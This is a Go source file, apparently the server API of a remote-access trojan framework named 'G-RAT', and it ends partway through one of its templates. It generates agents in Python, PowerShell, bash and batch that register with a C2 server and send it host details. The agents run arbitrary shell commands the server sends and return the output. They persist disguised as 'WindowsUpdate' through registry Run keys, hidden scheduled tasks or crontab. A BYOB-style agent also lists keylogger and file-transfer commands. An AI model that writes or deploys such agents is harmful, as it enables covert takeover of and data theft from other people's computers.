package api

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"text/template"
	"time"
)

// HandlePayload handles payload generation requests
func HandlePayload(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	var payload struct {
		Type           string `json:"type"`
		C2Server       string `json:"c2_server"`
		BeaconInterval int    `json:"beacon_interval"`
		Persistence    bool   `json:"persistence"`
		Obfuscation    bool   `json:"obfuscation"`
	}
	
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		http.Error(w, "Invalid payload data", http.StatusBadRequest)
		return
	}
	
	// Validate payload
	if payload.Type == "" {
		http.Error(w, "Missing payload type", http.StatusBadRequest)
		return
	}
	
	if payload.C2Server == "" {
		http.Error(w, "Missing C2 server URL", http.StatusBadRequest)
		return
	}
	
	if payload.BeaconInterval <= 0 {
		payload.BeaconInterval = 60
	}
	
	// Create a filename for the payload
	timestamp := time.Now().Format("20060102150405")
	filename := fmt.Sprintf("grat_payload_%s_%s", payload.Type, timestamp)
	
	// Add appropriate extension
	switch payload.Type {
	case "windows-standalone":
		filename += ".bat"
	case "windows-bat":
		filename += ".bat"
	case "windows-ps1":
		filename += ".ps1"
	case "python":
		filename += ".py"
	case "byob":
		filename += ".py"
	case "go":
		filename += ".go"
	case "linux":
		filename += ".sh"
	default:
		filename += ".txt"
	}
	
	// Make sure downloads directory exists
	downloadsDir := filepath.Join("server", "downloads")
	os.MkdirAll(downloadsDir, 0755)
	
	// Generate payload based on type
	var generatedFilePath string
	var err error
	
	switch payload.Type {
	case "windows-standalone":
		generatedFilePath, err = generateStandaloneBatchPayload(downloadsDir, filename, payload.C2Server, payload.BeaconInterval, payload.Persistence)
	case "windows-bat":
		generatedFilePath, err = generateWindowsPayload(downloadsDir, filename, payload.C2Server, payload.BeaconInterval, payload.Persistence)
	case "windows-ps1":
		generatedFilePath, err = generatePowershellPayload(downloadsDir, filename, payload.C2Server, payload.BeaconInterval, payload.Persistence)
	case "python":
		generatedFilePath, err = generatePythonPayload(downloadsDir, filename, payload.C2Server, payload.BeaconInterval, payload.Persistence)
	case "byob":
		generatedFilePath, err = generateByobPayload(downloadsDir, filename, payload.C2Server, payload.BeaconInterval, payload.Persistence)
	case "go":
		generatedFilePath, err = generateGoPayload(downloadsDir, filename, payload.C2Server, payload.BeaconInterval, payload.Persistence)
	case "linux":
		generatedFilePath, err = generateLinuxPayload(downloadsDir, filename, payload.C2Server, payload.BeaconInterval, payload.Persistence)
	default:
		// For other types, create a simple text file for now
		filePath := filepath.Join(downloadsDir, filename)
		file, err := os.Create(filePath)
		if err != nil {
			log.Printf("Error creating payload file: %v", err)
			http.Error(w, "Failed to generate payload", http.StatusInternalServerError)
			return
		}
		defer file.Close()
		
		fmt.Fprintf(file, "G-RAT Payload\n")
		fmt.Fprintf(file, "Type: %s\n", payload.Type)
		fmt.Fprintf(file, "C2 Server: %s\n", payload.C2Server)
		fmt.Fprintf(file, "Beacon Interval: %d seconds\n", payload.BeaconInterval)
		fmt.Fprintf(file, "Persistence: %v\n", payload.Persistence)
		fmt.Fprintf(file, "Obfuscation: %v\n", payload.Obfuscation)
		
		generatedFilePath = filePath
	}
	
	if err != nil {
		log.Printf("Error generating payload: %v", err)
		http.Error(w, "Failed to generate payload: "+err.Error(), http.StatusInternalServerError)
		return
	}
	
	// Create a download URL
	downloadURL := fmt.Sprintf("/downloads/%s", filepath.Base(generatedFilePath))
	
	// Return success response
	response := map[string]string{
		"message": "Payload generated successfully",
		"filename": filepath.Base(generatedFilePath),
		"download_url": downloadURL,
	}
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

// generatePythonPayload creates a Python script payload
func generatePythonPayload(dir, filename, c2Server string, interval int, persistence bool) (string, error) {
	filePath := filepath.Join(dir, filename)
	
	// Python payload template
	const pythonTemplate = `#!/usr/bin/env python3
import os
import sys
import time
import socket
import platform
import uuid
import subprocess
try:
    import requests
except ImportError:
    print("Installing requests module...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

# Configuration
C2_SERVER = "{{.C2Server}}"
BEACON_INTERVAL = {{.Interval}}
AGENT_ID = str(uuid.uuid4())

def register_agent():
    """Register this agent with the C2 server"""
    system_info = {
        "hostname": socket.gethostname(),
        "os": platform.system(),
        "architecture": platform.machine(),
        "username": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
    }
    
    data = {
        "id": AGENT_ID,
        "ip": get_ip(),
        "system_info": system_info
    }
    
    try:
        response = requests.post(
            f"{C2_SERVER}/api/register",
            json=data
        )
        if response.ok:
            return response.json()
        return None
    except Exception as e:
        print(f"Registration failed: {e}")
        return None

def beacon():
    """Send beacon to C2 server"""
    data = {"agent_id": AGENT_ID}
    
    try:
        response = requests.post(
            f"{C2_SERVER}/api/beacon",
            json=data
        )
        return response.ok
    except:
        return False

def get_task():
    """Get task from C2 server"""
    try:
        response = requests.get(
            f"{C2_SERVER}/api/task?agent_id={AGENT_ID}"
        )
        if response.ok:
            return response.json()
        return None
    except:
        return None

def send_result(task_id, output, error, exit_code):
    """Send task result back to C2 server"""
    data = {
        "agent_id": AGENT_ID,
        "task_id": task_id,
        "output": output,
        "error": error,
        "exit_code": exit_code,
        "start_time": time.time(),
        "finish_time": time.time()
    }
    
    try:
        response = requests.post(
            f"{C2_SERVER}/api/result",
            json=data
        )
        return response.ok
    except:
        return False

def execute_command(command):
    """Execute a shell command and return the output"""
    try:
        proc = subprocess.Popen(
            command, 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE
        )
        stdout, stderr = proc.communicate()
        return stdout.decode(), stderr.decode(), proc.returncode
    except Exception as e:
        return "", str(e), 1

def get_ip():
    """Get the agent's external IP address"""
    try:
        response = requests.get("https://api.ipify.org")
        if response.ok:
            return response.text
        return "Unknown"
    except:
        return "Unknown"

def setup_persistence():
    """Setup persistence based on the operating system"""
    if {{.Persistence}}:
        system = platform.system().lower()
        try:
            if system == "windows":
                # Windows persistence via registry
                import winreg
                key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
                winreg.CloseKey(key)
            elif system == "linux" or system == "darwin":
                # Linux/Mac persistence via crontab
                cron_cmd = f"@reboot {sys.executable} {os.path.abspath(__file__)}"
                subprocess.run(f"(crontab -l 2>/dev/null; echo '{cron_cmd}') | crontab -", shell=True)
        except:
            pass

def main():
    print("G-RAT Agent starting...")
    print(f"Agent ID: {AGENT_ID}")
    
    # Register with C2
    result = register_agent()
    if not result:
        print("Failed to register with C2 server")
        return
    
    print("Successfully registered with C2 server")
    print(f"Beaconing every {BEACON_INTERVAL} seconds")
    
    # Setup persistence if enabled
    setup_persistence()
    
    # Main loop
    try:
        while True:
            # Send beacon
            if beacon():
                print("Beacon sent successfully")
            
            # Get task
            task = get_task()
            if task and task.get("type") != "noop":
                task_id = task.get("id")
                task_type = task.get("type")
                command = task.get("command")
                
                print(f"Received task: {task_type} - {command}")
                
                if task_type == "terminate":
                    print("Received terminate command, exiting...")
                    break
                
                if task_type == "shell":
                    # Execute shell command
                    print(f"Executing command: {command}")
                    output, error, exit_code = execute_command(command)
                    
                    print(f"Command output: {output}")
                    if error:
                        print(f"Command error: {error}")
                    
                    if send_result(task_id, output, error, exit_code):
                        print("Result sent successfully")
                    else:
                        print("Failed to send result")
            
            # Sleep before next beacon
            time.sleep(BEACON_INTERVAL)
    except KeyboardInterrupt:
        print("Agent terminated by user")
    
if __name__ == "__main__":
    main()
`

	tmpl, err := template.New("python_payload").Parse(pythonTemplate)
	if err != nil {
		return "", err
	}

	file, err := os.Create(filePath)
	if err != nil {
		return "", err
	}
	defer file.Close()

	data := struct {
		C2Server   string
		Interval   int
		Persistence bool
	}{
		C2Server:   c2Server,
		Interval:   interval,
		Persistence: persistence,
	}

	if err := tmpl.Execute(file, data); err != nil {
		return "", err
	}

	// Make executable
	os.Chmod(filePath, 0755)
	return filePath, nil
}

// generateGoPayload creates a Go source payload
func generateGoPayload(dir, filename, c2Server string, interval int, persistence bool) (string, error) {
	filePath := filepath.Join(dir, filename)
	
	// Go payload template with simplified content
	const goTemplate = `package main

import (
	"fmt"
)

func main() {
	fmt.Println("G-RAT Go Agent")
	fmt.Println("C2 Server: {{.C2Server}}")
	fmt.Println("Beacon Interval: {{.Interval}} seconds")
	fmt.Println("Persistence: {{.Persistence}}")
	fmt.Println("This is a placeholder. In a real implementation, this would be actual agent code.")
}
`

	tmpl, err := template.New("go_payload").Parse(goTemplate)
	if err != nil {
		return "", err
	}

	file, err := os.Create(filePath)
	if err != nil {
		return "", err
	}
	defer file.Close()

	data := struct {
		C2Server   string
		Interval   int
		Persistence bool
	}{
		C2Server:   c2Server,
		Interval:   interval,
		Persistence: persistence,
	}

	if err := tmpl.Execute(file, data); err != nil {
		return "", err
	}

	return filePath, nil
}

// generateWindowsPayload creates a Windows batch file payload that launches a Python script
func generateWindowsPayload(dir, filename, c2Server string, interval int, persistence bool) (string, error) {
	// Generate a batch file that explains how to run the agent
	pythonFilename := "grat_agent_" + time.Now().Format("20060102150405") + ".py"
	batchPath := filepath.Join(dir, filename)
	
	// First create a Python payload
	pythonPath, err := generatePythonPayload(dir, pythonFilename, c2Server, interval, persistence)
	if err != nil {
		return "", err
	}
	
	// Create a batch file wrapper
	batchFile, err := os.Create(batchPath)
	if err != nil {
		return "", err
	}
	defer batchFile.Close()
	
	// Extract just the filename from the python path
	pythonFileOnly := filepath.Base(pythonPath)
	
	// Write batch file contents
	batchContent := `@echo off
echo G-RAT Agent Launcher
echo ===================
echo.

REM Check if Python is installed
where python >nul 2>nul
if %errorlevel% neq 0 (
    echo Python not found! Please install Python 3.7 or newer.
    echo You can download it from https://www.python.org/downloads/
    echo.
    echo Press any key to exit...
    pause > nul
    exit /b
)

REM Launch agent
echo Python found, launching agent...
python "` + pythonFileOnly + `"
pause
`
	if _, err := batchFile.WriteString(batchContent); err != nil {
		return "", err
	}
	
	return batchPath, nil
}

// generatePowershellPayload creates a PowerShell script payload
func generatePowershellPayload(dir, filename, c2Server string, interval int, persistence bool) (string, error) {
	filePath := filepath.Join(dir, filename)
	
	const psTemplate = `
# G-RAT PowerShell Agent
$C2Server = "{{.C2Server}}"
$BeaconInterval = {{.Interval}}
$AgentID = [Guid]::NewGuid().ToString()

Write-Host "G-RAT PowerShell Agent starting..."
Write-Host "Agent ID: $AgentID"
Write-Host "C2 Server: $C2Server"
Write-Host "Beacon Interval: $BeaconInterval seconds"

function Register-Agent {
    $ComputerInfo = Get-CimInstance -Class Win32_ComputerSystem
    $OSInfo = Get-CimInstance -Class Win32_OperatingSystem
    
    $SystemInfo = @{
        hostname = $env:COMPUTERNAME
        os = $OSInfo.Caption
        architecture = $env:PROCESSOR_ARCHITECTURE
        username = $env:USERNAME
    }
    
    $Data = @{
        id = $AgentID
        ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content
        system_info = $SystemInfo
    } | ConvertTo-Json
    
    try {
        $Response = Invoke-RestMethod -Uri "$C2Server/api/register" -Method Post -Body $Data -ContentType "application/json"
        return $Response
    } catch {
        Write-Host "Registration failed: $_"
        return $null
    }
}

function Send-Beacon {
    $Data = @{
        agent_id = $AgentID
    } | ConvertTo-Json
    
    try {
        $Response = Invoke-RestMethod -Uri "$C2Server/api/beacon" -Method Post -Body $Data -ContentType "application/json"
        return $true
    } catch {
        return $false
    }
}

function Get-Task {
    try {
        $Response = Invoke-RestMethod -Uri "$C2Server/api/task?agent_id=$AgentID" -Method Get
        return $Response
    } catch {
        return $null
    }
}

function Send-Result ($TaskId, $Output, $Error, $ExitCode) {
    $Data = @{
        agent_id = $AgentID
        task_id = $TaskId
        output = $Output
        error = $Error
        exit_code = $ExitCode
        start_time = [Math]::Round((Get-Date -UFormat %s))
        finish_time = [Math]::Round((Get-Date -UFormat %s))
    } | ConvertTo-Json
    
    try {
        $Response = Invoke-RestMethod -Uri "$C2Server/api/result" -Method Post -Body $Data -ContentType "application/json"
        return $true
    } catch {
        return $false
    }
}

function Execute-Command ($Command) {
    try {
        $Output = & cmd /c $Command 2>&1
        $ExitCode = $LASTEXITCODE
        return $Output, "", $ExitCode
    } catch {
        return "", $_.Exception.Message, 1
    }
}

# Register with C2
$Result = Register-Agent
if (-not $Result) {
    Write-Host "Failed to register with C2 server"
    exit
}

Write-Host "Successfully registered with C2 server"

# Setup persistence if enabled
if ($true -eq {{if .Persistence}}$true{{else}}$false{{end}}) {
    try {
        $ScheduledTask = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File '$PSCommandPath'"
        $Trigger = New-ScheduledTaskTrigger -AtLogon
        Register-ScheduledTask -Action $ScheduledTask -Trigger $Trigger -TaskName "WindowsUpdate" -Description "Windows Update Service" -User "$env:USERNAME" -RunLevel Highest -ErrorAction SilentlyContinue
        Write-Host "Persistence established via scheduled task"
    } catch {
        Write-Host "Failed to establish persistence: $_"
    }
}

# Main loop
try {
    while ($true) {
        # Send beacon
        $BeaconResult = Send-Beacon
        if ($BeaconResult) {
            Write-Host "Beacon sent successfully"
        }
        
        # Get task
        $Task = Get-Task
        if ($Task -and $Task.type -ne "noop") {
            Write-Host "Received task: $($Task.type) - $($Task.command)"
            
            if ($Task.type -eq "terminate") {
                Write-Host "Received terminate command, exiting..."
                break
            }
            
            if ($Task.type -eq "shell") {
                Write-Host "Executing command: $($Task.command)"
                $Output, $Error, $ExitCode = Execute-Command $Task.command
                
                Write-Host "Command output: $Output"
                if ($Error) {
                    Write-Host "Command error: $Error"
                }
                
                $ResultSent = Send-Result $Task.id $Output $Error $ExitCode
                if ($ResultSent) {
                    Write-Host "Result sent successfully"
                } else {
                    Write-Host "Failed to send result"
                }
            }
        }
        
        # Sleep before next beacon
        Start-Sleep -Seconds $BeaconInterval
    }
} catch {
    Write-Host "Agent terminated unexpectedly: $_"
}
`

	tmpl, err := template.New("powershell_payload").Parse(psTemplate)
	if err != nil {
		return "", err
	}

	file, err := os.Create(filePath)
	if err != nil {
		return "", err
	}
	defer file.Close()

	data := struct {
		C2Server   string
		Interval   int
		Persistence bool
	}{
		C2Server:   c2Server,
		Interval:   interval,
		Persistence: persistence,
	}

	if err := tmpl.Execute(file, data); err != nil {
		return "", err
	}

	return filePath, nil
}

// generateLinuxPayload creates a Linux shell script payload
func generateLinuxPayload(dir, filename, c2Server string, interval int, persistence bool) (string, error) {
	filePath := filepath.Join(dir, filename)
	
	const shTemplate = `#!/bin/bash
# G-RAT Linux Agent

C2_SERVER="{{.C2Server}}"
BEACON_INTERVAL={{.Interval}}
AGENT_ID=$(cat /proc/sys/kernel/random/uuid)

echo "G-RAT Linux Agent starting..."
echo "Agent ID: $AGENT_ID"
echo "C2 Server: $C2_SERVER"
echo "Beacon Interval: $BEACON_INTERVAL seconds"

register_agent() {
    HOSTNAME=$(hostname)
    OS=$(uname -s)
    ARCH=$(uname -m)
    USERNAME=$(whoami)
    
    DATA="{\"id\":\"$AGENT_ID\",\"ip\":\"$(curl -s https://api.ipify.org)\",\"system_info\":{\"hostname\":\"$HOSTNAME\",\"os\":\"$OS\",\"architecture\":\"$ARCH\",\"username\":\"$USERNAME\"}}"
    
    curl -s -X POST -H "Content-Type: application/json" -d "$DATA" "$C2_SERVER/api/register"
}

send_beacon() {
    DATA="{\"agent_id\":\"$AGENT_ID\"}"
    curl -s -X POST -H "Content-Type: application/json" -d "$DATA" "$C2_SERVER/api/beacon"
}

get_task() {
    curl -s -X GET "$C2_SERVER/api/task?agent_id=$AGENT_ID"
}

send_result() {
    TASK_ID=$1
    OUTPUT=$2
    ERROR=$3
    EXIT_CODE=$4
    
    NOW=$(date +%s)
    DATA="{\"agent_id\":\"$AGENT_ID\",\"task_id\":\"$TASK_ID\",\"output\":\"$OUTPUT\",\"error\":\"$ERROR\",\"exit_code\":$EXIT_CODE,\"start_time\":$NOW,\"finish_time\":$NOW}"
    
    curl -s -X POST -H "Content-Type: application/json" -d "$DATA" "$C2_SERVER/api/result"
}

execute_command() {
    OUTPUT=$(eval "$1" 2>&1)
    EXIT_CODE=$?
    
    echo "$OUTPUT"
    return $EXIT_CODE
}

# Setup persistence if enabled
if [ {{if .Persistence}}true{{else}}false{{end}} ]; then
    echo "Setting up persistence..."
    CRON_CMD="@reboot $(readlink -f "$0")"
    (crontab -l 2>/dev/null; echo "$CRON_CMD") | crontab -
fi

# Register with C2
register_agent

# Main loop
while true; do
    # Send beacon
    send_beacon
    
    # Get task
    TASK=$(get_task)
    TASK_TYPE=$(echo "$TASK" | grep -o '"type":"[^"]*"' | cut -d'"' -f4)
    
    if [ "$TASK_TYPE" != "" ] && [ "$TASK_TYPE" != "noop" ]; then
        TASK_ID=$(echo "$TASK" | grep -o '"id":"[^"]*"' | cut -d'"' -f4)
        COMMAND=$(echo "$TASK" | grep -o '"command":"[^"]*"' | cut -d'"' -f4)
        
        echo "Received task: $TASK_TYPE - $COMMAND"
        
        if [ "$TASK_TYPE" = "terminate" ]; then
            echo "Received terminate command, exiting..."
            break
        fi
        
        if [ "$TASK_TYPE" = "shell" ]; then
            echo "Executing command: $COMMAND"
            OUTPUT=$(execute_command "$COMMAND")
            EXIT_CODE=$?
            
            echo "Command output: $OUTPUT"
            
            send_result "$TASK_ID" "$OUTPUT" "" $EXIT_CODE
        fi
    fi
    
    # Sleep before next beacon
    sleep $BEACON_INTERVAL
done
`

	tmpl, err := template.New("linux_payload").Parse(shTemplate)
	if err != nil {
		return "", err
	}

	file, err := os.Create(filePath)
	if err != nil {
		return "", err
	}
	defer file.Close()

	data := struct {
		C2Server   string
		Interval   int
		Persistence bool
	}{
		C2Server:   c2Server,
		Interval:   interval,
		Persistence: persistence,
	}

	if err := tmpl.Execute(file, data); err != nil {
		return "", err
	}

	// Make executable
	os.Chmod(filePath, 0755)
	return filePath, nil
}

// generateByobPayload creates a BYOB-style Python agent
func generateByobPayload(dir, filename, c2Server string, interval int, persistence bool) (string, error) {
	filePath := filepath.Join(dir, filename)
	
	const byobTemplate = `#!/usr/bin/env python3
# BYOB-inspired payload for G-RAT C2
# Simplified version for demonstration purposes

import os
import sys
import time
import socket
import platform
import uuid
import subprocess
import base64
import json
import random
import threading
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Try to import requests, install if not available
try:
    import requests
    logging.info("Requests module found")
except ImportError:
    logging.info("Installing requests module...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "--quiet"])
        import requests
        logging.info("Requests module installed successfully")
    except Exception as e:
        logging.error(f"Failed to install requests: {e}")
        sys.exit(1)

# Configuration
C2_SERVER = "{{.C2Server}}"  # Change to your server address
BEACON_INTERVAL = {{.Interval}}  # Seconds between beacons
JITTER = 10  # Random delay added to beacon (percentage of interval)
AGENT_ID = str(uuid.uuid4())
SESSION_KEY = base64.b64encode(os.urandom(32)).decode()  # Session encryption key (not used yet)
DEBUG = True  # Set to False for production

class Agent:
    def __init__(self):
        self.server = C2_SERVER
        self.id = AGENT_ID
        self.interval = BEACON_INTERVAL
        self.jitter = JITTER
        self.online = False
        self.info = self._collect_system_info()
        self.commands = {
            'shell': self._execute_shell,
            'screenshot': self._take_screenshot,
            'download': self._download_file,
            'upload': self._upload_file,
            'persist': self._setup_persistence,
            'keylogger': self._start_keylogger,
            'terminate': self._terminate
        }
        self.running = False
        self.keylogger_active = False
        self.keylog_data = ""
        
        logging.info(f"Agent initialized with ID: {self.id}")
        
    def _collect_system_info(self):
        """Collect system information"""
        try:
            info = {
                'platform': platform.platform(),
                'system': platform.system(),
                'release': platform.release(),
                'version': platform.version(),
                'architecture': platform.machine(),
                'processor': platform.processor(),
                'hostname': socket.gethostname(),
                'username': os.getlogin() if hasattr(os, 'getlogin') else self._get_username(),
                'ip': self._get_public_ip(),
                'mac': self._get_mac_address(),
                'admin': self._is_admin()
            }
            logging.info("System information collected")
            return info
        except Exception as e:
            logging.error(f"Error collecting system info: {e}")
            return {
                'platform': 'Unknown',
                'system': platform.system(),
                'hostname': 'Unknown',
                'username': 'Unknown',
                'ip': 'Unknown'
            }
    
    def _get_username(self):
        """Get username when os.getlogin() isn't available"""
        try:
            if platform.system() == 'Windows':
                return os.environ.get('USERNAME', 'Unknown')
            else:
                return os.environ.get('USER', 'Unknown')
        except:
            return 'Unknown'
    
    def _get_public_ip(self):
        """Get the public IP address"""
        try:
            response = requests.get("https://api.ipify.org", timeout=5)
            return response.text.strip()
        except:
            return "Unknown"
    
    def _get_mac_address(self):
        """Get the MAC address"""
        try:
            if platform.system() == 'Windows':
                output = subprocess.check_output('getmac').decode()
                mac = output.split('\n')[3].split()[0].replace('-', ':')
                return mac
            else:
                # For Unix systems
                output = subprocess.check_output("ifconfig || ip link", shell=True).decode()
                mac = ""
                for line in output.split('\n'):
                    if 'ether' in line or 'link/ether' in line:
                        mac = line.split()[1]
                        break
                return mac
        except:
            return "00:00:00:00:00:00"
    
    def _is_admin(self):
        """Check if running with admin privileges"""
        try:
            if platform.system() == 'Windows':
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.geteuid() == 0
        except:
            return False
    
    def register(self):
        """Register with the C2 server"""
        try:
            data = {
                'id': self.id,
                'ip': self.info['ip'],
                'system_info': {
                    'hostname': self.info['hostname'],
                    'os': self.info['system'],
                    'architecture': self.info['architecture'],
                    'username': self.info['username']
                }
            }
            
            response = requests.post(
                f"{self.server}/api/register",
                json=data,
                headers={"Content-Type": "application/json"},
                timeout=10
            )
            
            if response.status_code == 200:
                self.online = True
                logging.info(f"Successfully registered with C2 server: {self.server}")
                return True
            else:
                logging.error(f"Failed to register. Status: {response.status_code}")
                return False
        except Exception as e:
            logging.error(f"Registration error: {e}")
            return False
    
    def beacon(self):
        """Send beacon to C2 server"""
        try:
            data = {
                'agent_id': self.id
            }
            
            response = requests.post(
                f"{self.server}/api/beacon",
                json=data,
                headers={"Content-Type": "application/json"},
                timeout=10
            )
            
            if response.status_code == 200:
                logging.debug("Beacon sent successfully")
                return True
            else:
                logging.error(f"Beacon failed. Status: {response.status_code}")
                return False
        except Exception as e:
            logging.error(f"Beacon error: {e}")
            return False
    
    def get_task(self):
        """Get task from C2 server"""
        try:
            response = requests.get(
                f"{self.server}/api/task?agent_id={self.id}",
                timeout=10
            )
            
            if response.status_code == 200:
                task = response.json()
                if task and task.get('type') != 'noop':
                    logging.info(f"Received task: {task.get('type')} - {task.get('command')}")
                    return task
                return None
            else:
                logging.error(f"Failed to get task. Status: {response.status_code}")
                return None
        except Exception as e:
            logging.error(f"Get task error: {e}")
            return None
    
    def send_result(self, task_id, output, error="", exit_code=0):
        """Send task result back to C2 server"""
        try:
            data = {
                'agent_id': self.id,
                'task_id': task_id,
                'output': str(output),
                'error': str(error),
                'exit_code': exit_code,
                'start_time': time.time(),
                'finish_time': time.time()
            }
            
            response = requests.post(
                f"{self.server}/api/result",
                json=data,
                headers={"Content-Type": "application/json"},
                timeout=10
            )
            
            if response.status_code == 200:
                logging.info("Result sent successfully")
                return True
            else:
                logging.error(f"Failed to send result. Status: {response.status_code}")
                return False
        except Exception as e:
            logging.error(f"Send result error: {e}")
            return False
    
    def process_task(self, task):
        """Process a task from the C2 server"""
        task_type = task.get('type')
        task_id = task.get('id')
        command = task.get('command')
        
        if task_type in self.commands:
            try:
                output, error, exit_code = self.commands[task_type](command)
                self.send_result(task_id, output, error, exit_code)
            except Exception as e:
                self.send_result(task_id, "", str(e), 1)
        else:
            self.send_result(task_id, "", f"Unknown task type: {task_type}", 1)
    
    def _execute_shell(self, command):
        """Execute a shell command"""
        try:
            logging.info(f"Executing shell command: {command}")
            
            if platform.system() == 'Windows':
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            else:
                process = subprocess.Popen(['/bin/sh', '-c', command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
            stdout, stderr = process.communicate()
            return stdout.decode(), stderr.decode(), process.returncode
        except Exception as e:
            return "", str(e), 1
    
    def _take_screenshot(self, _):
        """Take a screenshot (placeholder)"""
        try:
            # This is just a placeholder - would use PIL or similar in a real implementation
            return "Screenshot functionality not implemented", "", 0
        except Exception as e:
            return "", str(e), 1
    
    def _download_file(self, remote_path):
        """Download a file from the agent to the C2 (placeholder)"""
        try:
            if os.path.exists(remote_path):
                return f"File exists: {remote_path} ({os.path.getsize(remote_path)} bytes)", "", 0
            else:
                return "", f"File not found: {remote_path}", 1
        except Exception as e:
            return "", str(e), 1
    
    def _upload_file(self, args):
        """Upload a file from C2 to the agent (placeholder)"""
        try:
            path, data = args.split(' ', 1)
            return f"Upload functionality not implemented. Would save to: {path}", "", 0
        except Exception as e:
            return "", str(e), 1
    
    def _setup_persistence(self, method=""):
        """Setup persistence on the system (placeholder)"""
        try:
            if platform.system() == 'Windows':
                return "Windows persistence would add registry key or scheduled task", "", 0
            else:
                return "Unix persistence would add crontab entry", "", 0
        except Exception as e:
            return "", str(e), 1
    
    def _start_keylogger(self, duration="60"):
        """Start a keylogger (placeholder)"""
        try:
            self.keylogger_active = True
            return "Keylogger functionality not implemented", "", 0
        except Exception as e:
            return "", str(e), 1
    
    def _terminate(self, _):
        """Terminate the agent"""
        self.running = False
        return "Agent terminating...", "", 0
    
    def run(self):
        """Main agent loop"""
        if not self.register():
            time.sleep(30)  # Wait before retry
            return
        
        self.running = True
        
        while self.running:
            try:
                # Add jitter to the beacon interval
                jitter_factor = 1 + random.uniform(-self.jitter/100, self.jitter/100)
                sleep_time = self.interval * jitter_factor
                
                self.beacon()
                
                # Get and process tasks
                task = self.get_task()
                if task:
                    self.process_task(task)
                
                # Sleep until next beacon
                time.sleep(sleep_time)
                
            except KeyboardInterrupt:
                logging.info("Agent terminated by keyboard interrupt")
                self.running = False
            except Exception as e:
                logging.error(f"Error in main loop: {e}")
                time.sleep(self.interval)  # Sleep before retry

if __name__ == "__main__":
    try:
        logging.info("Starting BYOB-style agent")
        agent = Agent()
        agent.run()
    except Exception as e:
        logging.error(f"Critical error: {e}")
`

	tmpl, err := template.New("byob_payload").Parse(byobTemplate)
	if err != nil {
		return "", err
	}

	file, err := os.Create(filePath)
	if err != nil {
		return "", err
	}
	defer file.Close()

	data := struct {
		C2Server   string
		Interval   int
		Persistence bool
	}{
		C2Server:   c2Server,
		Interval:   interval,
		Persistence: persistence,
	}

	if err := tmpl.Execute(file, data); err != nil {
		return "", err
	}

	// Make executable
	os.Chmod(filePath, 0755)
	
	// Also create a batch file launcher for Windows
	batchName := strings.TrimSuffix(filename, ".py") + "_launcher.bat"
	batchPath := filepath.Join(dir, batchName)
	
	batchContent := `@echo off
echo G-RAT BYOB-style Agent Launcher
echo ==============================
echo.

REM Check if Python is installed
where python >nul 2>nul
if %errorlevel% NEQ 0 (
    echo Python not found! Please install Python 3.7 or newer.
    echo You can download it from https://www.python.org/downloads/
    echo.
    echo Press any key to exit...
    pause > nul
    exit /b
)

REM Launch agent
echo Python found, launching BYOB-style agent...
python "` + filename + `"
pause
`
	if err := os.WriteFile(batchPath, []byte(batchContent), 0644); err != nil {
		return "", err
	}
	
	return filePath, nil
}

// generateStandaloneBatchPayload creates a Windows batch payload that doesn't require Python
func generateStandaloneBatchPayload(dir, filename, c2Server string, interval int, persistence bool) (string, error) {
	filePath := filepath.Join(dir, filename)
	
	batchTemplate := `@echo off
setlocal EnableDelayedExpansion
title Windows System Service
color 0a

:: Set Configuration
set "C2_SERVER={{.C2Server}}"
set "BEACON_INTERVAL={{.Interval}}"
set "AGENT_ID="
set "DEBUG=true"

:: Check for admin rights
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Warning: Not running with administrator privileges
    echo [!] Some system information and commands may not work properly
) else (
    echo [+] Running with administrator privileges
)

:: Generate a unique agent ID
for /f "tokens=2 delims=[]" %%a in ('ver') do set "WIN_VER=%%a"
for /f %%a in ('wmic csproduct get uuid ^| findstr -v UUID') do set "UUID=%%a"
for /f %%a in ('wmic bios get serialnumber ^| findstr -v Serial') do set "SERIAL=%%a"
set "AGENT_ID=%COMPUTERNAME%-%UUID:~0,8%-%RANDOM%"

echo [+] G-RAT Windows Agent
echo [+] Agent ID: %AGENT_ID%
echo [+] C2 Server: %C2_SERVER%

:: Create a temporary PowerShell script for system info collection
echo function Get-SystemInfo { > "%TEMP%\grat_sysinfo.ps1"
echo   $ComputerInfo = Get-CimInstance Win32_ComputerSystem >> "%TEMP%\grat_sysinfo.ps1"
echo   $OSInfo = Get-CimInstance Win32_OperatingSystem >> "%TEMP%\grat_sysinfo.ps1"
echo   $CPUInfo = Get-CimInstance Win32_Processor >> "%TEMP%\grat_sysinfo.ps1"
echo   $IPConfig = Get-NetIPAddress ^| Where-Object {$_.AddressFamily -eq "IPv4" -and $_.IPAddress -ne "127.0.0.1"} >> "%TEMP%\grat_sysinfo.ps1"
echo   $AdminStatus = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) >> "%TEMP%\grat_sysinfo.ps1"
echo   $MAC = (Get-NetAdapter ^| Where-Object {$_.Status -eq "Up"} ^| Select-Object -First 1).MacAddress >> "%TEMP%\grat_sysinfo.ps1"
echo   $MemoryGB = [math]::Round($OSInfo.TotalVisibleMemorySize / 1MB, 2) >> "%TEMP%\grat_sysinfo.ps1"
